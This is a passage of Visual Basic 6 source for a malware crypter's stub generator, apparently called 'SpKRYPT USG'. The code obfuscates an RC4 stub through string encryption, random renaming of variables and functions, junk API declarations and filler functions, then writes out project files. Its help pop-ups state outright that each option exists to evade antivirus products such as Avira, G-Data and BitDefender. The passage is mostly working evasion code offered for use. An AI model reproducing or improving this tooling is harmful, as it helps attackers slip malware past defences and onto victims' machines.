                sTmp = sTmp & vbNewLine & sLines(i)
    End If
    
    Else
    sTmp = sLines(i)
    End If
    
        If sTmp = "" Then sTmp = sLines(i)
        sRC4Code = sRC4Code & sTmp & vbNewLine
        If InStr(sLines(i), "Private Sub ") <> 0 Or InStr(sLines(i), "Property ") <> 0 Or InStr(sLines(i), "Function ") Or InStr(sLines(i), "Public Sub ") <> 0 <> 0 Then
            bWrite = True
        End If
        If InStr(sLines(i), "End Function") <> 0 Or InStr(sLines(i), "End Sub") <> 0 Or InStr(sLines(i), "End Property") <> 0 Then
            bWrite = False
        End If
    Next
Else
sRC4Code = txtcPEL
End If

Sleep (1500)

'------- Encrypt Str ---------
Call FindStr(sRC4Code, sStrCount3, sStrings3)
If chkStrROT.Value = xtpChecked Then
encstrvar() = Split(sStrings3, ":")
For strint = 1 To sStrCount3
If encstrvar(strint) <> "" Then
If Len(encstrvar(strint)) > 0 Then
sRC4Code = Replace(sRC4Code, encstrvar(strint), RotXFunction & RotXEncrypt((Replace(encstrvar(strint), Chr(34), vbNullString)))) 'StrToChar(encstrvar(strint)))
End If
End If
Next
End If
Call FindStr(sRC4Code, sStrCount3, sStrings3)
sStrings3 = Replace(sStrings3, "kernel32", vbNullString)
If chkStrAscii.Value = xtpChecked Then
Dim rc4str As Integer
Dim rc4encvar() As String
rc4encvar() = Split(sStrings3, ":")
For rc4str = 1 To sStrCount3
If rc4encvar(rc4str) <> "" Then
If Len(rc4encvar(rc4str)) > 0 Then
sRC4Code = Replace$(sRC4Code, rc4encvar(rc4str), StrToChar(rc4encvar(rc4str)))
End If
End If
Next
End If

'--- RtlMoveMem ---
sRC4Code = Replace(sRC4Code, "e4j8c5PCdAMaIZLPodaU", RtlMoveMem)

RtlApi = "Private Declare Sub " & RtlMoveMem & " Lib " & Chr(34) & "kernel32" & Chr(34) & " Alias " & Chr(34) & "RtlMoveMemory" & Chr(34) & " (pDst As Any, pSrc As Any, ByVal dlen As Long)"

sRC4Code = Replace(sRC4Code, "e4j8c5PCdAMaIZLPodaU", RtlMoveMem)

Call FindFunctions(sRC4Code, sFuncCount3, sFunctions3)
Call FindVar(sRC4Code, sVarCount3, sVariables3)

'------- Replace Vars/Funcs --
'm_sBox(0 To 255)
Dim sBox As String
sBox = StrGen(5, 15)

sRC4Code = Replace(sRC4Code, "sBox", sBox)
sVariables3 = Replace(sVariables3, sBox & "(0 To 255)", vbNullString)

sRC4Code = Replace(sRC4Code, "DecryptString", DecryptString)


sVariables3 = Replace(sVariables3, DecryptString, vbNullString)
sVariables3 = Replace(sVariables3, sBox & "(0 To 255)", vbNullString)
Dim VariableRC4() As String
VariableRC4() = Split(sVariables3, ":")
For F = 1 To sVarCount3
If Len(VariableRC4(F)) > 1 Then
sRC4Code = Replace(sRC4Code, VariableRC4(F), StrGen(2, 15))
End If
Next

Dim RC4Func() As String
RC4Func() = Split(sFunctions3, ":")
For F = 1 To sFuncCount3 + 10
If RC4Func(F) <> "" Then
If Len(RC4Func(F)) > 1 Then
sRC4Code = Replace(sRC4Code, RC4Func(F), StrGen(2, 15))
End If

End If
Next

Sleep (1500)

'---- Drop ROT Module ----
If chkCompileC.Value = xtpChecked Then
If chkStrROT.Value = xtpChecked Then
RotModule = StrGen(8, 20)
Call CreateModuleROT(StrGen(8, 20), RotModule, RotXFunction, "C:")
End If
Else
If chkStrROT.Value = xtpChecked Then
RotModule = StrGen(8, 20)
Call CreateModuleROT(StrGen(8, 20), RotModule, RotXFunction, App.path)
End If
End If
'-------------------------

'------- Dump File -----------
F = FreeFile
If chkCompileC.Value = xtpChecked Then
Open "C:" & "\" & RC4File & ".cls" For Output As #F
Print #F, "VERSION 1.0 CLASS"
Print #F, "BEGIN"
Print #F, "MultiUse = -1  'True"
Print #F, "Persistable = 0  'NotPersistable"
Print #F, "DataBindingBehavior = 0  'vbNone"
Print #F, "DataSourceBehavior = 0   'vbNone"
Print #F, "MTSTransactionMode = 0   'NotAnMTSObject"
Print #F, "End"
Print #F, "Attribute VB_Name = " & Chr(34) & RC4Name & Chr(34)
Print #F, "Attribute VB_GlobalNameSpace = False"
Print #F, "Attribute VB_Creatable = True"
Print #F, "Attribute VB_PredeclaredId = False"
Print #F, "Attribute VB_Exposed = False"
If chkJunkAPI.Value = xtpChecked Then
imax = txtMaxAPI.Text
imin = txtMinAPI.Text
iLen = Int((imax - imin + 1) * Rnd) + imin / 2
For lol = 1 To iLen
Print #F, JunkAPI
Next
Print #F, RtlApi
For lol = 1 To iLen
Print #F, JunkAPI
Next
ElseIf chkAvira2.Value = xtpChecked Then
Print #F, ApiBypass
Print #F, RtlApi
Print #F, ApiBypass2
ElseIf chkAhPi.Value = xtpChecked Then
imax = txtMaxAPI.Text
imin = txtMinAPI.Text
iLen = Int((imax - imin + 1) * Rnd) + imin / 2

imax = txtMaxAPI.Text
imin = txtMinAPI.Text
iLen = Int((imax - imin + 1) * Rnd) + imin / 2
For lol = 1 To iLen
Print #F, APIMethod2
Next
Print #F, RtlApi
For lol = 1 To iLen
Print #F, APIMethod2
Next
Else
Print #F, RtlApi
End If
Print #F, sRC4Code
If chkJunkFunc.Value = xtpChecked Then
Dim Trash3 As String
If chkTrashFunc.Value = xtpChecked Then
Trash3 = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, True)
Else
Trash3 = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, False)
End If
Print #F, Trash3
End If
Close #F
Else
Open App.path & "\" & RC4File & ".cls" For Output As #F
Print #F, "VERSION 1.0 CLASS"
Print #F, "BEGIN"
Print #F, "MultiUse = -1  'True"
Print #F, "Persistable = 0  'NotPersistable"
Print #F, "DataBindingBehavior = 0  'vbNone"
Print #F, "DataSourceBehavior = 0   'vbNone"
Print #F, "MTSTransactionMode = 0   'NotAnMTSObject"
Print #F, "End"
Print #F, "Attribute VB_Name = " & Chr(34) & RC4Name & Chr(34)
Print #F, "Attribute VB_GlobalNameSpace = False"
Print #F, "Attribute VB_Creatable = True"
Print #F, "Attribute VB_PredeclaredId = False"
Print #F, "Attribute VB_Exposed = False"
If chkJunkAPI.Value = xtpChecked Then
imax = txtMaxAPI.Text
imin = txtMinAPI.Text
iLen = Int((imax - imin + 1) * Rnd) + imin / 2
For lol = 1 To iLen
Print #F, JunkAPI
Next
Print #F, RtlApi
For lol = 1 To iLen
Print #F, JunkAPI
Next

ElseIf chkAvira2.Value = xtpChecked Then
Print #F, ApiBypass
Print #F, RtlApi
Print #F, ApiBypass2


ElseIf chkAhPi.Value = xtpChecked Then
imax = txtMaxAPI.Text
imin = txtMinAPI.Text
iLen = Int((imax - imin + 1) * Rnd) + imin / 2

For lol = 1 To iLen
Print #F, APIMethod2
Next
Print #F, RtlApi
For lol = 1 To iLen
Print #F, APIMethod2
Next

Else
Print #F, RtlApi
End If
Print #F, sRC4Code
If chkJunkFunc.Value = xtpChecked Then

If chkTrashFunc.Value = xtpChecked Then
Trash3 = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, True)
Else
Trash3 = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, False)
End If
Print #F, Trash3
End If
Close #F
End If
'-----------------------------

Sleep (1500)
ProjNm = StrGen(5, 20)

'------- Create Project ------
If chkCompileC.Value = xtpChecked Then
If chkStrROT.Value = xtpChecked Then
If chkCompileC.Value = xtpChecked Then
Call ProjectCreate(ProjNm, StrGen(2, 20), cPELFile, cPELName, RC4File, RC4Name, FrmFile, 1, RotModule, RotModule, True, "C:")
Else
Call ProjectCreate(ProjNm, StrGen(2, 20), cPELFile, cPELName, RC4File, RC4Name, FrmFile, 1, RotModule, RotModule, , "C:")
End If
Else
If chkCompileC.Value = xtpChecked Then
Call ProjectCreate(ProjNm, StrGen(2, 20), cPELFile, cPELName, RC4File, RC4Name, FrmFile, , , , True, "C:")
Else
Call ProjectCreate(ProjNm, StrGen(2, 20), cPELFile, cPELName, RC4File, RC4Name, FrmFile, , , , , "C:")
End If
End If
Else
If chkStrROT.Value = xtpChecked Then
If chkCompileC.Value = xtpChecked Then
Call ProjectCreate(ProjNm, StrGen(2, 20), cPELFile, cPELName, RC4File, RC4Name, FrmFile, 1, RotModule, RotModule, True, App.path)
Else
Call ProjectCreate(ProjNm, StrGen(2, 20), cPELFile, cPELName, RC4File, RC4Name, FrmFile, 1, RotModule, RotModule, , App.path)
End If
Else
If chkCompileC.Value = xtpChecked Then
Call ProjectCreate(ProjNm, StrGen(2, 20), cPELFile, cPELName, RC4File, RC4Name, FrmFile, , , , True, App.path)
Else
Call ProjectCreate(ProjNm, StrGen(2, 20), cPELFile, cPELName, RC4File, RC4Name, FrmFile, , , , , App.path)
End If
End If
End If
'-----------------------------
Sleep (1500)
'------- Drop Settings -------
If chkCompileC.Value = xtpChecked Then
Call WriteSettings(ProjNm, txtSplit.Text, "C:")
Else
Call WriteSettings(ProjNm, txtSplit.Text, App.path)
End If
'-----------------------------
Sleep (500)
cmdCompile.Enabled = True
If chkCleanUpLast.Value = xtpChecked Then
MsgBox "Stub successfully generated, and removed last project!"
ElseIf chkCompileC.Value = xtpChecked Then
MsgBox "Stub generated! All files is in C:\"
Else
MsgBox "Stub successfully generated!"
End If
End Sub


Private Sub cmdGenSplit_Click()
txtSplit.Text = sRandom
End Sub

Private Sub Form_Load()
Me.Caption = "                                       -= SpKRYPT USG For: " & frmLogin.txtUser.Text & " =-"
txtSplit.Text = sRandom
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub Image10_Click()
MsgBox "String encryption may be one of the most important option. It helps to bypass many AV's if the encryption method is not detected, and one of the never-going-to-be-detected is ASCII.", vbInformation
End Sub

Private Sub Image11_Click()
MsgBox "The Split key is one of the most common ways for AV's to detect a stub, and if the Split is generic, which in many crypter it is, it will detect all the stubs! Using a random Split key will make it very hard to AV's to detect a stub.", vbInformation
End Sub

Private Sub Image16_Click()
MsgBox "2 Private methods to bypass Avira! When using method 2, no need to add junk APIs.", vbInformation
End Sub

Private Sub Image17_Click()
MsgBox "Junk functions is used to make the stub undetected by many AV's", vbInformation
End Sub

Private Sub Image18_Click()
MsgBox "Removing blank space will decrease stub size!", vbInformation
End Sub

Private Sub Image19_Click()
MsgBox "G-Data and BitDefender are detecting the stub path, so compiling the stub to C:\ will undetect it from those two!", vbInformation
End Sub

Private Sub Image24_Click()
MsgBox "Trashing is the most important option in the whole USG. No trash makes it detected heavily.", vbInformation
End Sub

Private Sub Image7_Click()
MsgBox "Junk APIs are used to bypass Avira and a few other antiviruses, and is one important option.", vbInformation
End Sub

Private Sub Image8_Click()
MsgBox "The Clean Up options will remove the project files which you won't really need.", vbInformation
End Sub

Private Sub Image9_Click()
MsgBox "The randomization is a important part to keep the stubs unique fron eachother!", vbInformation
End Sub
